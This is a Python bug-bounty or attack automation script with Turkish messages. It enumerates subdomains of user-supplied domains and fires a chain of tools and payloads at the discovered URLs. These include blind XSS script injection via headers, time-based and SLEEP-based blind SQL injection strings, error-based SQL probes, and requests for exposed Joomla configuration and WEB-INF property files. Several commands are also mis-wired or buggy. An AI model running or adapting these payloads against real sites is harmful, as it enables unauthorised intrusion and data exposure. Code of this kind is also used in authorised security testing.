from termcolor import colored
import subprocess
import threading

def run_command(command, output_file=None):
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if output_file:
        with open(output_file, 'w') as file:
            file.write(result.stdout)
    return result.stdout

def get_user_input(prompt):
    user_input = input(prompt)
    while not user_input.strip():
        print(colored("Giriş boş olamaz. Tekrar deneyin.", "red"))
        user_input = input(prompt)
    return user_input

def print_banner():
    banner = "\033[1;36m" + r"""
    ________    _______  ___________         .____    .___ _______  _____________________ 
    \_____  \   \      \ \_   _____/         |    |   |   |\      \ \_   _____/\______   \
    /    |   \  /   |   \ |    __)_   ______ |    |   |   |/   |   \ |    __)_  |       _/
    /    |    \/    |    \|        \ /_____/ |    |___|   /    |    \|        \ |    |   \
    \_______  /\____|__  /_______  /         |_______ \___\____|__  /_______  / |____|_  /
            \/         \/        \/                  \/           \/        \/         \/ 
    """
    print(banner)

def run_threaded_command(cmd, output_file):
    result = run_command(cmd, output_file)
    print(f"Komut çıktısı {output_file} dosyasına kaydedildi.")

def main():
    print_banner()

    
    domains_file = get_user_input("Lütfen domain listesini içeren txt dosyasının adını girin: ")

    # Subdomains bulma
    print(colored("Subdomains bulunuyor...", "cyan"))
    subdomains_command = f'subfinder -dL {domains_file} -silent -all | sort -u > subdomains.txt'
    run_command(subdomains_command)
    print(colored("Subdomains bulma tamamlandı. Bulunan subdomainler subdomains.txt dosyasına kaydedildi.\n", "green"))

    
    subdomains_file = 'subdomains.txt'
    try:
        with open(subdomains_file, 'r') as sub_file:
            subdomains = [line.strip() for line in sub_file.readlines() if line.strip()]
    except FileNotFoundError:
        print(colored(f"{subdomains_file} bulunamadı. Subdomain listesini oluşturun.", "red"))
        return

    print(colored(f"\nToplam {len(subdomains)} subdomain bulundu.\n", "green"))

    print(colored("\nÇeşitli güvenlik kontrolleri başlatılıyor...\n", "yellow"))

    
    gospider_command = (
        f'gospider -S command5_output.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" '
        f'--other-source | grep -e "code-200" | awk \'{{print $5}}\' | grep "=" | qsreplace -a | dalfox pipe'
    )

    
    gf_xss_command = (
        f'cat parameters.txt | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>" && echo "$host Vulnerable"; done '
    )

    http_code_command = 'curl -o /dev/null -s -w %{http_code}'

    commands = [
        (f'cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > parameters.txt', 'command5_output.txt'),
        (gf_xss_command, 'xss_results.txt'),
        (f'httpx -l parameters.txt -path "api/index.php/v1/config/application?public=true" -mc 200', 'INF.txt'),
        (f'cat parameters.txt | waybackurls | gau | bxss -payload \'<script src=https://google.com ></script>\' -header "X-Forwarder-For"', 'XSS_output.txt'),
        (f'httpx -l subdomains.txt --status-code -path /WEB-INF/classes/argo.properties', 'WEB-INF.txt'),
        (f'cat parameters.txt | waybackurls | gau | bxss -payload \'<script src=https://google.com ></script>\' -header "X-Forwarder-For"', 'XSS1_output.txt'),
        (f'nuclei -l parameters.txt -t fuzzing-templates -o nuclei_results.txt', 'fuzzing_results.txt'),
        (f'echo parameters.txt | httpx -silent -H "X-Forwarded-For: \'XOR(if (now()=sysdate(), sleep (13),0))OR" -rt -timeout 20 -mrt \'>13\'', 'time_based_sql_output.txt'),
        (f'cat parameters.txt | grep ".php" | sed \'s/\.php.*/.php\\//\' | sort -u | sed s/$/%27%22%60/ | httpx -silent -ms "You have an error in your SQL syntax" > SQL_syntax.txt', 'SQL_syntax.txt'),
        (f'cat command5_output.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt', 'blind_sqli_output.txt'),
        (f'cat blindsqli.txt | parallel -j50 -q "{http_code_command}\\\n"', 'blind_sqli_output.txt'),
        (gospider_command, 'gospider_results.txt')
    ]

    print(colored("Blind SQL taraması yapılıyor...\n", "cyan"))

    for cmd, output_file in commands:
        print(colored(f"Komut çalışıyor: {cmd}", "yellow"))
        thread = threading.Thread(target=run_threaded_command, args=(cmd, output_file))
        thread.start()
        thread.join()
        print(colored(f"Komut tamamlandı: {cmd}", "green"))

    print(colored("\nTüm işlemler tamamlandı.", "green"))

if __name__ == "__main__":
    main()
